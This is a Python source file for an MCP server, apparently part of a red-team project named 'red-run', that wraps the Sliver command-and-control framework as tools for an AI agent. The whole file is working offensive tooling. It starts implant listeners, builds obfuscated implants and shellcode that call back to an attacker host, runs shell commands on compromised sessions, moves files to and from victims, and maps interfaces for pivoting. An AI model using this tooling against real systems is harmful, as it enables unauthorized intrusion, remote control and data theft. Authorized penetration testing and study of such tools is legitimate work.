"""Sliver C2 MCP server for red-run.

Wraps Sliver's gRPC API via sliver-py, exposing session management,
implant generation, and pivot operations as MCP tools. Connects to a
running sliver-server daemon using an operator config file.

Runs as SSE on 127.0.0.1:8023 (configurable via SLIVER_SSE_PORT).
"""

from __future__ import annotations

import asyncio
import json
import hashlib
import os
import time
from pathlib import Path

from mcp.server.fastmcp import FastMCP

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
_SSE_PORT = int(os.environ.get("SLIVER_SSE_PORT", "8023"))


def _find_config() -> Path | None:
    """Locate the Sliver operator config file."""
    default = _PROJECT_ROOT / "engagement" / "sliver.cfg"
    if default.exists():
        return default
    return None


_NOT_CONFIGURED = (
    "ERROR: Sliver not configured for this engagement.\n"
    "Run: config.sh and select Sliver as the shell backend,\n"
    "or manually create engagement/sliver.cfg:\n"
    "  sliver-server operator --name red-run --lhost 127.0.0.1 "
    "--permissions all --save engagement/sliver.cfg"
)

_NOT_CONNECTED = (
    "ERROR: Failed to connect to Sliver daemon. "
    "Ensure sliver-server daemon is running."
)


def create_server() -> FastMCP:
    mcp = FastMCP(
        "red-run-sliver-server",
        host="127.0.0.1",
        port=_SSE_PORT,
        instructions=(
            "Manages Sliver C2 sessions for red-run. Use start_mtls_listener "
            "to create listeners, generate_implant to build payloads, "
            "list_sessions to see active agents, execute to run commands, "
            "and start_pivot_listener for internal pivoting."
        ),
    )

    _client = None
    _client_lock = asyncio.Lock()

    async def _get_client():
        nonlocal _client
        async with _client_lock:
            if _client is not None and _client.is_connected():
                return _client
            config_path = _find_config()
            if config_path is None:
                return None
            try:
                import sliver
                config = sliver.SliverClientConfig.parse_config_file(
                    str(config_path)
                )
                client = sliver.SliverClient(config)
                await client.connect()
                _client = client
                return _client
            except Exception:
                return None

    async def _require_client() -> str | None:
        """Check config + connection. Returns error string or None."""
        if _find_config() is None:
            return _NOT_CONFIGURED
        client = await _get_client()
        if client is None:
            return _NOT_CONNECTED
        return None

    # ── Listener management ─────────────────────────────────────────

    @mcp.tool()
    async def start_mtls_listener(
        host: str = "0.0.0.0",
        port: int = 4444,
    ) -> str:
        """Start an mTLS listener for Sliver implant callbacks.

        Args:
            host: Bind address (default 0.0.0.0).
            port: Bind port (default 4444).
        """
        if err := await _require_client():
            return err
        try:
            client = await _get_client()
            listener = await client.start_mtls_listener(host=host, port=port)
            return json.dumps({
                "status": "listening",
                "job_id": listener.JobID,
                "host": host,
                "port": port,
                "protocol": "mtls",
            })
        except Exception as e:
            return f"ERROR: Failed to start mTLS listener: {e}"

    @mcp.tool()
    async def start_https_listener(
        host: str = "0.0.0.0",
        port: int = 443,
        domain: str = "",
    ) -> str:
        """Start an HTTPS listener for Sliver implant callbacks.

        Args:
            host: Bind address.
            port: Bind port (default 443).
            domain: Optional domain for TLS certificate.
        """
        if err := await _require_client():
            return err
        try:
            client = await _get_client()
            listener = await client.start_https_listener(
                host=host, port=port, domain=domain
            )
            return json.dumps({
                "status": "listening",
                "job_id": listener.JobID,
                "host": host,
                "port": port,
                "protocol": "https",
            })
        except Exception as e:
            return f"ERROR: Failed to start HTTPS listener: {e}"

    @mcp.tool()
    async def list_jobs() -> str:
        """List active Sliver listener jobs."""
        if err := await _require_client():
            return err
        try:
            client = await _get_client()
            jobs = await client.jobs()
            result = []
            for job in jobs:
                result.append({
                    "job_id": job.ID,
                    "name": job.Name,
                    "protocol": job.Protocol,
                    "port": job.Port,
                })
            return json.dumps({"jobs": result, "count": len(result)})
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    async def kill_job(job_id: int) -> str:
        """Stop a listener job.

        Args:
            job_id: Job ID from list_jobs.
        """
        if err := await _require_client():
            return err
        try:
            client = await _get_client()
            await client.kill_job(job_id)
            return json.dumps({"status": "killed", "job_id": job_id})
        except Exception as e:
            return f"ERROR: {e}"

    # ── Implant generation ──────────────────────────────────────────

    @mcp.tool()
    async def generate_implant(
        target_os: str = "linux",
        arch: str = "amd64",
        mtls_host: str = "",
        mtls_port: int = 4444,
        format: str = "exe",
        name: str = "",
    ) -> str:
        """Generate a Sliver session-mode implant.

        Builds an obfuscated implant binary. Session mode (interactive,
        persistent mTLS connection) — not beacon mode.

        Args:
            target_os: Target OS — linux, windows, darwin.
            mtls_host: Callback host (attackbox IP). Required.
            mtls_port: Callback port (must match listener).
            arch: Target architecture — amd64, arm64, 386.
            format: Output format — exe, shared, shellcode, service.
            name: Optional implant name.
        """
        if not mtls_host:
            return "ERROR: mtls_host is required (attackbox callback IP)."

        # Use sliver CLI for generation — sliver-py protobuf stubs are
        # out of sync with Sliver 1.7.x and fail with "record not found".
        import shutil
        import subprocess

        sliver_bin = shutil.which("sliver")
        if not sliver_bin:
            return "ERROR: sliver client binary not found in PATH."

        config_path = _find_config()
        if config_path is None:
            return _NOT_CONFIGURED

        evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
        evidence_dir.mkdir(parents=True, exist_ok=True)

        ext = {"linux": "", "windows": ".exe", "darwin": ""}.get(
            target_os, ""
        )
        implant_name = name or f"implant-{int(time.time())}"
        filename = f"{implant_name}{ext}"
        filepath = evidence_dir / filename

        try:
            # Build sliver console command via --rc script
            rc_file = _PROJECT_ROOT / "engagement" / ".sliver-generate.rc"
            cmd = (
                f"generate --mtls {mtls_host}:{mtls_port} "
                f"--os {target_os} --arch {arch} "
                f"--save {filepath} --skip-symbols"
            )
            if format == "shellcode":
                cmd = cmd.replace("generate ", "generate --format shellcode ")
            elif format == "shared":
                cmd = cmd.replace("generate ", "generate --format shared-lib ")
            elif format == "service":
                cmd = cmd.replace("generate ", "generate --format service ")
            if name:
                cmd += f" --name {name}"

            rc_file.write_text(cmd + "\nexit\n")

            result = subprocess.run(
                [sliver_bin, "console", "--rc", str(rc_file)],
                capture_output=True, text=True, timeout=600,
                env={**os.environ, "SLIVER_CONFIG": str(config_path)},
            )

            rc_file.unlink(missing_ok=True)

            if not filepath.exists():
                return (
                    f"ERROR: Implant generation failed.\n"
                    f"stdout: {result.stdout[-500:] if result.stdout else ''}\n"
                    f"stderr: {result.stderr[-500:] if result.stderr else ''}"
                )

            file_size = filepath.stat().st_size
            sha256 = hashlib.sha256(filepath.read_bytes()).hexdigest()
            filepath.chmod(0o755)

            return json.dumps({
                "status": "generated",
                "name": filename,
                "path": str(filepath),
                "size": file_size,
                "sha256": sha256,
                "os": target_os,
                "arch": arch,
                "format": format,
                "callback": f"mtls://{mtls_host}:{mtls_port}",
            })
        except Exception as e:
            return f"ERROR: Implant generation failed: {e}"

    # ── Session management ──────────────────────────────────────────

    @mcp.tool()
    async def list_sessions() -> str:
        """List all active Sliver sessions with metadata."""
        if err := await _require_client():
            return err
        try:
            client = await _get_client()
            sessions = await client.sessions()
            result = []
            for s in sessions:
                result.append({
                    "session_id": str(s.ID),
                    "name": s.Name,
                    "remote_address": s.RemoteAddress,
                    "hostname": s.Hostname,
                    "username": s.Username,
                    "os": s.OS,
                    "arch": s.Arch,
                    "transport": s.Transport,
                    "pid": s.PID,
                    "filename": s.Filename,
                    "active_c2": s.ActiveC2,
                    "alive": not s.IsDead,
                })
            return json.dumps({
                "sessions": result,
                "count": len(result),
            })
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    async def execute(
        session_id: str = "",
        exe: str = "",
        args: list[str] | None = None,
        shell_cmd: str = "",
        output: bool = True,
    ) -> str:
        """Execute a command on a Sliver session.

        Args:
            session_id: Session ID from list_sessions. Required.
            exe: Executable to run (e.g., "/bin/sh", "cmd.exe").
            args: Arguments as a JSON array. Example: ["-c", "id && uname -a"].
                  Each element maps to one argv slot — no splitting.
            shell_cmd: Shorthand for shell commands. Sets exe=/bin/sh,
                       args=["-c", shell_cmd]. Use this for most commands.
                       Example: shell_cmd="id && uname -a"
            output: Capture stdout/stderr (default true).
        """
        if not session_id:
            return "ERROR: session_id is required."
        if shell_cmd:
            exe = "/bin/sh"
            args = ["-c", shell_cmd]
        if not exe:
            return "ERROR: exe or shell_cmd is required."
        if err := await _require_client():
            return err

        try:
            client = await _get_client()
            session = await client.interact_session(session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            result = await session.execute(
                exe,
                args or [],
                output,
            )
            return json.dumps({
                "status": "executed",
                "stdout": result.Stdout.decode("utf-8", errors="replace")
                if result.Stdout else "",
                "stderr": result.Stderr.decode("utf-8", errors="replace")
                if result.Stderr else "",
                "exit_code": result.Status,
            })
        except Exception as e:
            return f"ERROR: Command execution failed: {e}"

    @mcp.tool()
    async def upload(
        session_id: str = "",
        local_path: str = "",
        remote_path: str = "",
    ) -> str:
        """Upload a file to a Sliver session target.

        Args:
            session_id: Session ID. Required.
            local_path: Local file to upload. Required.
            remote_path: Destination path on target. Required.
        """
        if not session_id or not local_path or not remote_path:
            return "ERROR: session_id, local_path, and remote_path required."
        if err := await _require_client():
            return err

        local = Path(local_path)
        if not local.exists():
            return f"ERROR: Local file not found: {local_path}"

        try:
            client = await _get_client()
            session = await client.interact_session(session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            data = local.read_bytes()
            result = await session.upload(remote_path, data)
            return json.dumps({
                "status": "uploaded",
                "remote_path": result.Path,
                "size": len(data),
            })
        except Exception as e:
            return f"ERROR: Upload failed: {e}"

    @mcp.tool()
    async def download(
        session_id: str = "",
        remote_path: str = "",
        local_path: str = "",
    ) -> str:
        """Download a file from a Sliver session target.

        Args:
            session_id: Session ID. Required.
            remote_path: File path on target. Required.
            local_path: Local destination. Defaults to engagement/evidence/.
        """
        if not session_id or not remote_path:
            return "ERROR: session_id and remote_path are required."
        if err := await _require_client():
            return err

        try:
            client = await _get_client()
            session = await client.interact_session(session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            result = await session.download(remote_path)

            if not local_path:
                evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
                evidence_dir.mkdir(parents=True, exist_ok=True)
                filename = Path(remote_path).name or "download"
                local_path = str(evidence_dir / filename)

            with open(local_path, "wb") as f:
                f.write(result.Data)

            return json.dumps({
                "status": "downloaded",
                "remote_path": remote_path,
                "local_path": local_path,
                "size": len(result.Data),
            })
        except Exception as e:
            return f"ERROR: Download failed: {e}"

    @mcp.tool()
    async def ifconfig(session_id: str = "") -> str:
        """List network interfaces on a Sliver session target.

        Useful for pivot detection — look for additional NICs/subnets.

        Args:
            session_id: Session ID. Required.
        """
        if not session_id:
            return "ERROR: session_id is required."
        if err := await _require_client():
            return err

        try:
            client = await _get_client()
            session = await client.interact_session(session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            result = await session.ifconfig()
            interfaces = []
            for iface in result.NetInterfaces:
                interfaces.append({
                    "name": iface.Name,
                    "mac": iface.MAC,
                    "addresses": list(iface.IPAddresses),
                })
            return json.dumps({"interfaces": interfaces})
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    async def kill_session(session_id: str = "") -> str:
        """Terminate a Sliver session.

        Args:
            session_id: Session ID. Required.
        """
        if not session_id:
            return "ERROR: session_id is required."
        if err := await _require_client():
            return err

        try:
            client = await _get_client()
            await client.kill_session(session_id)
            return json.dumps({
                "status": "killed",
                "session_id": session_id,
            })
        except Exception as e:
            return f"ERROR: {e}"

    # ── Pivot management ────────────────────────────────────────────

    @mcp.tool()
    async def list_pivots(session_id: str = "") -> str:
        """List pivot listeners on a session.

        Args:
            session_id: Session ID to check for pivot listeners. Required.
        """
        if not session_id:
            return "ERROR: session_id is required."
        if err := await _require_client():
            return err

        try:
            client = await _get_client()
            session = await client.interact_session(session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            pivots = await session.pivot_listeners()
            result = []
            for p in pivots:
                result.append({
                    "id": p.ID,
                    "type": str(p.Type),
                    "bind_address": p.BindAddress,
                })
            return json.dumps({"pivots": result, "count": len(result)})
        except Exception as e:
            return f"ERROR: {e}"

    # ── HTTP custom routes ──────────────────────────────────────────

    from starlette.requests import Request
    from starlette.responses import Response

    @mcp.custom_route("/status", methods=["GET"])
    async def status(request: Request) -> Response:
        """Health check endpoint for run.sh."""
        try:
            if _find_config() is None:
                body = json.dumps({"status": "not_configured", "sessions": 0})
            else:
                client = await _get_client()
                if client is None:
                    body = json.dumps({"status": "disconnected", "sessions": 0})
                else:
                    sessions = await client.sessions()
                    body = json.dumps({"status": "connected", "sessions": len(sessions)})
        except Exception:
            body = json.dumps({"status": "error", "sessions": 0})
        return Response(content=body, media_type="application/json")

    return mcp


def main() -> None:
    server = create_server()
    server.run(transport="sse")


if __name__ == "__main__":
    main()
